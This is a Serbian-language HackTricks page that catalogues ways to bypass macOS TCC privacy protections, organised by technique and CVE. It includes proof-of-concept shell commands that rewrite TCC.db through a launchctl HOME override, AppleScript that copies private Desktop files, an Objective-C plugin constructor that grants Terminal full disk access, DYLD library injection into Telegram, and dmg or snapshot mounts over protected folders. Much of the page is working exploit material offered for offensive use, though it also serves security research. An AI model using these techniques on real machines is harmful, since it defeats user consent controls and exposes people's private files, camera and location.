# Bypassi za macOS TCC

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Po funkcionalnosti

### Bypass za pisanje

Ovo nije zaobilazak, već samo kako TCC radi: **Ne štiti od pisanja**. Ako Terminal **nema pristup čitanju Desktopa korisnika, i dalje može pisati u njega**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Prošireni atribut `com.apple.macl`** dodaje se novom **fajlu** kako bi aplikacija koja ga je kreirala imala pristup za čitanje.

### Bypass za SSH

Podrazumevano, pristup putem **SSH je imao "Pristup celom disku"**. Da biste onemogućili ovo, morate ga imati navedeno ali onemogućeno (uklanjanje sa liste neće ukloniti te privilegije):

![](<../../../../../.gitbook/assets/image (569).png>)

Ovde možete pronaći primere kako su neki **malveri uspeli da zaobiđu ovu zaštitu**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Imajte na umu da sada, da biste mogli omogućiti SSH, potreban vam je **Pristup celom disku**.
{% endhint %}

### Upravljanje ekstenzijama - CVE-2022-26767

Atribut **`com.apple.macl`** dodeljuje se fajlovima kako bi **određena aplikacija imala dozvole za čitanje**. Ovaj atribut se postavlja kada se fajl prevuče preko aplikacije ili kada korisnik **duplim klikom** otvori fajl sa podrazumevanom aplikacijom.

Stoga, korisnik može **registrovati zlonamernu aplikaciju** koja će obrađivati sve ekstenzije i pozvati Launch Services da **otvori** bilo koji fajl (tako da će zlonamernom fajlu biti omogućen pristup za čitanje).

### iCloud

Pomoću privilegije **`com.apple.private.icloud-account-access`** moguće je komunicirati sa XPC servisom **`com.apple.iCloudHelper`** koji će **pružiti iCloud tokene**.

**iMovie** i **Garageband** imaju ovu privilegiju i druge koje su dozvoljene.

Za više **informacija** o eksploataciji za **dobijanje iCloud tokena** iz te privilegije, pogledajte predavanje: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatizacija

Aplikacija sa dozvolom **`kTCCServiceAppleEvents`** može kontrolisati druge aplikacije. To znači da bi mogla **zloupotrebiti dozvole koje su dodeljene drugim aplikacijama**.

Za više informacija o Apple skriptama pogledajte:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Na primer, ako aplikacija ima **dozvolu za automatizaciju nad `iTerm`**-om, na primer u ovom primeru **`Terminal`** ima pristup nad iTerm-om:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Nad iTerm-om

Terminal, koji nema Pristup celom disku, može pozvati iTerm, koji ima taj pristup, i koristiti ga za izvršavanje radnji:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Preko Finder-a

Ili ako aplikacija ima pristup preko Finder-a, može koristiti skriptu poput ove:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Ponašanjem aplikacije

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**tccd daemon** u userland-u koristi **`HOME`** **env** promenljivu da bi pristupio TCC bazi podataka korisnika koja se nalazi na: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovom Stack Exchange postu](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i zato što TCC daemon radi putem `launchd` unutar domena trenutnog korisnika, moguće je **kontrolisati sve environment promenljive** koje se prosleđuju.\
Stoga, **napadač može postaviti `$HOME` environment** promenljivu u **`launchctl`**-u da bi pokazivala na **kontrolisani direktorijum**, **restartovati** TCC daemon, a zatim **direktno izmeniti TCC bazu podataka** da bi sebi dodelio **sva dostupna TCC ovlašćenja** bez ikakvog upita korisnika.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Napomene

Napomene su imale pristup TCC zaštićenim lokacijama, ali kada se napravi napomena, ona se **kreira na nezaštićenoj lokaciji**. Dakle, mogli ste zatražiti od napomena da kopira zaštićeni fajl u napomenu (na nezaštićenoj lokaciji) i zatim pristupiti fajlu:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokacija

Binarna datoteka `/usr/libexec/lsd` sa bibliotekom `libsecurity_translocate` imala je privilegiju `com.apple.private.nullfs_allow` koja joj je omogućavala kreiranje **nullfs** montaže i privilegiju `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`** za pristup svakom fajlu.

Bilo je moguće dodati karantenski atribut "Library", pozvati XPC servis **`com.apple.security.translocation`** i tada bi se mapa Library mapirala na **`$TMPDIR/AppTranslocation/d/d/Library`** gde bi svi dokumenti unutar Library mape bili **dostupni**.

### CVE-2023-38571 - Muzika i TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Muzika`** ima interesantnu funkcionalnost: Kada je pokrenuta, uvozi fajlove koji su spušteni u **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** u korisnikovu "medijsku biblioteku". Osim toga, poziva nešto poput: **`rename(a, b);`** gde su `a` i `b`:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Ova **`rename(a, b);`** funkcionalnost je ranjiva na **Race Condition**, jer je moguće staviti lažnu **TCC.db** datoteku unutar foldera `Automatically Add to Music.localized` i zatim, kada se nova mapa (b) kreira da se kopira fajl, obriše i usmeri na **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Ako je **`SQLITE_SQLLOG_DIR="putanja/folder"`**, to praktično znači da će **svaka otvorena baza podataka biti kopirana na tu putanju**. U ovom CVE-u je ova kontrola zloupotrebljena kako bi se **upisalo** unutar **SQLite baze podataka** koja će biti **otvorena od strane procesa sa FDA bazom podataka TCC-a**, a zatim zloupotrebljena **`SQLITE_SQLLOG_DIR`** sa simboličkom vezom u nazivu fajla, tako da kada se ta baza podataka **otvori**, korisnička **TCC.db datoteka bude prepisana** otvorenom bazom.

**Više informacija** [**u writeup-u**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **i** [**u predavanju**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Ako je postavljena okružna promenljiva **`SQLITE_AUTO_TRACE`**, biblioteka **`libsqlite3.dylib`** će početi **beležiti** sve SQL upite. Mnoge aplikacije koriste ovu biblioteku, pa je bilo moguće beležiti sve njihove SQLite upite.

Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup TCC zaštićenim informacijama.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Ova **env promenljiva se koristi od strane `Metal` okvira** koji je zavisnost za razne programe, najpoznatije za `Music`, koji ima FDA.

Postavljanje sledećeg: `MTL_DUMP_PIPELINES_TO_JSON_FILE="putanja/ime"`. Ako je `putanja` validan direktorijum, bag će biti aktiviran i možemo koristiti `fs_usage` da vidimo šta se dešava u programu:

* otvoriće se `open()` fajl, nazvan `putanja/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
* jedan ili više `write()` će upisati sadržaj u fajl (mi nemamo kontrolu nad tim)
* `putanja/.dat.nosyncXXXX.XXXXXX` će biti preimenovan u `putanja/ime`

Ovo je privremeni upis fajla, praćen **`rename(stari, novi)`** **koji nije bezbedan**.

Nije bezbedan jer mora **posebno da reši stare i nove putanje**, što može potrajati i može biti ranjivo na Trku Uslova. Za više informacija možete pogledati `xnu` funkciju `renameat_internal()`.

{% hint style="danger" %}
Dakle, ako privilegovani proces preimenuje iz foldera koji kontrolišete, možete dobiti RCE i naterati ga da pristupi drugom fajlu ili, kao u ovom CVE-u, otvoriti fajl koji je privilegovana aplikacija kreirala i sačuvati FD.

Ako preimenovanje pristupi folderu koji kontrolišete, dok ste izmenili izvorni fajl ili imate FD do njega, možete promeniti odredišni fajl (ili folder) da pokazuje na simbolički link, tako da možete pisati kad god želite.
{% endhint %}

Ovo je bio napad u CVE-u: Na primer, da bi prebrisali korisnikov `TCC.db`, možemo:

* kreirati `/Users/hacker/ourlink` koji pokazuje na `/Users/hacker/Library/Application Support/com.apple.TCC/`
* kreirati direktorijum `/Users/hacker/tmp/`
* postaviti `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* aktivirati bag pokretanjem `Music` sa ovom env promenljivom
* uhvatiti `open()` `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
* ovde takođe `open()` ovaj fajl za pisanje i zadržati file deskriptor
* atomički zameniti `/Users/hacker/tmp` sa `/Users/hacker/ourlink` **u petlji**
* to radimo da bismo maksimizirali šanse za uspeh jer prozor trke je prilično kratak, ali gubitak trke ima zanemarljive posledice
* sačekaj malo
* proveri da li smo imali sreće
* ako ne, pokreni ponovo od početka

Više informacija na [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Sada, ako pokušate da koristite env promenljivu `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacije se neće pokrenuti.
{% endhint %}

### Apple Remote Desktop

Kao root možete omogućiti ovu uslugu i **ARD agent će imati pun pristup disku**, što korisnik može zloupotrebiti da bi kopirao novu **TCC bazu podataka korisnika**.

## Preko **NFSHomeDirectory**

TCC koristi bazu podataka u HOME folderu korisnika da bi kontrolisao pristup resursima specifičnim za korisnika na **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Stoga, ako korisnik uspe da ponovo pokrene TCC sa $HOME env promenljivom koja pokazuje na **drug folder**, korisnik može kreirati novu TCC bazu podataka u **/Library/Application Support/com.apple.TCC/TCC.db** i prevariti TCC da odobri bilo koju TCC dozvolu bilo kojoj aplikaciji.

{% hint style="success" %}
Imajte na umu da Apple koristi postavku koja se čuva unutar korisničkog profila u atributu **`NFSHomeDirectory`** kao vrednost za `$HOME`, pa ako kompromitujete aplikaciju sa dozvolama za izmenu ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), možete **oružaniti** ovu opciju sa TCC zaobilaženjem.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) da izmeni HOME folder korisnika.

1. Dobijte _csreq_ blob za ciljnu aplikaciju.
2. Ubacite lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blobom.
3. Izvezite unos korisničkih Directory Services sa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Izmenite unos Directory Services da promenite korisnički home direktorijum.
5. Uvezite izmenjeni unos Directory Services sa [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustavite korisnički _tccd_ i ponovo pokrenite proces.

Drugi POC koristi **`/usr/libexec/configd`** koji ima `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, napadač bi mogao da specificira **prilagođeni Bundle za učitavanje**. Stoga, eksploit **zamenjuje** metodu **`dsexport`** i **`dsimport`** za promenu korisničkog home direktorijuma sa **`configd` kodom za ubrizgavanje**.

Za više informacija pogledajte [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Ubacivanjem koda u proces

Postoje različite tehnike za ubacivanje koda u proces i zloupotrebu njegovih TCC privilegija:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Osim toga, najčešći način ubacivanja koda u proces zaobilaženjem TCC-a je putem **pluginova (učitavanje biblioteke)**.\
Pluginovi su dodatni kod obično u obliku biblioteka ili plist, koji će biti **učitani od strane glavne aplikacije** i izvršavati se pod njenim kontekstom. Stoga, ako glavna aplikacija ima pristup TCC ograničenim fajlovima (putem odobrenih dozvola ili privilegija), **prilagođeni kod će takođe imati pristup**.

### CVE-2020-27937 - Directory Utility

Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` je imala privilegiju **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala je pluginove sa ekstenzijom **`.daplug`** i **nije imala ojačanu** izvršnu biblioteku.

Da bi se iskoristio ovaj CVE, **`NFSHomeDirectory`** se **menja** (zloupotrebom prethodne privilegije) kako bi se mogla **preuzeti korisnička TCC baza podataka** i zaobići TCC.

Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

Binarni fajl **`/usr/sbin/coreaudiod`** je imao privilegije `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prva privilegija omogućava **ubacivanje koda**, a druga mu daje pristup za **upravljanje TCC-om**.

Ovaj binarni fajl je omogućavao učitavanje **dodatnih plug-inova** iz foldera `/Library/Audio/Plug-Ins/HAL`. Stoga je bilo moguće **učitati plug-in i zloupotrebiti TCC dozvole** pomoću ovog PoC-a:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### DAL (Device Abstraction Layer) dodaci

Sistemski programi koji otvaraju video strim preko Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **ove dodatke** u procesu koji se nalazi u `/Library/CoreMediaIO/Plug-Ins/DAL` (nije ograničeno SIP-om).

Dovoljno je samo da se tu skladišti biblioteka sa uobičajenim **konstruktorom** da bi se ubacila kod.

Nekoliko Apple aplikacija je bilo ranjivo na ovo.

### Firefox

Firefox aplikacija je imala dozvole `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Za više informacija o tome kako lako iskoristiti ovo [**proverite originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` je imao privilegije **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućavalo ubacivanje koda unutar procesa i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao privilegije **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, tako da je bilo moguće zloupotrebiti ga kako bi se **dobio pristup njegovim dozvolama**, kao što je snimanje kamerom. [**Payload možete pronaći u objašnjenju**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Primetite kako se koristi okružna promenljiva za učitavanje biblioteke, kreiran je **prilagođeni plist** da bi se ubacila ova biblioteka, a **`launchctl`** je korišćen za njeno pokretanje:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Otvaranjem poziva

Moguće je pozvati **`open`** čak i kada je sandbox aktiviran

### Terminalski skriptovi

Često je uobičajeno da terminal ima **Pristup celom disku (Full Disk Access - FDA)**, barem na računarima koje koriste tehničari. I moguće je pozvati **`.terminal`** skriptove koristeći ga.

**`.terminal`** skriptovi su plist fajlovi kao što je ovaj sa komandom koju treba izvršiti u ključu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Jedna aplikacija može napisati terminalni skriptu na lokaciji kao što je /tmp i pokrenuti je sa komandom poput:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montiranjem

### CVE-2020-9771 - TCC zaobilaženje i eskalacija privilegija putem montiranja APFS

**Bilo koji korisnik** (čak i neprivilegovan) može kreirati i montirati snimak vremenske mašine i **pristupiti SVIM datotekama** tog snimka.\
**Jedina privilegija** koja je potrebna je da aplikacija koja se koristi (kao što je `Terminal`) ima **Pristup celom disku** (Full Disk Access - FDA) (`kTCCServiceSystemPolicyAllfiles`), koju mora odobriti administrator. 

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Detaljnije objašnjenje možete **pronaći u originalnom izveštaju**.

### CVE-2021-1784 & CVE-2021-30808 - Montiranje preko TCC fajla

Čak i ako je TCC DB fajl zaštićen, bilo je moguće **montirati novi TCC.db fajl preko direktorijuma**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Proverite **potpunu eksploataciju** u [**originalnom članku**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i montiranje na drugom mestu zaobilazeći TCC zaštite.

### Lokacijske usluge

Postoji treća TCC baza podataka u **`/var/db/locationd/clients.plist`** koja označava klijente koji imaju dozvolu za **pristup lokacijskim uslugama**.\
Folder **`/var/db/locationd/` nije bio zaštićen od montiranja DMG datoteka**, pa je bilo moguće montirati sopstveni plist.

## Preko aplikacija pri pokretanju

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Preko grep komande

U nekoliko slučajeva, fajlovi će čuvati osetljive informacije poput email adresa, brojeva telefona, poruka... na nezaštićenim lokacijama (što se smatra ranjivošću u Apple-u).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Veštački klikovi

Ovo više ne funkcioniše, ali [**je funkcionisalo u prošlosti**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Još jedan način korišćenjem [**CoreGraphics događaja**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
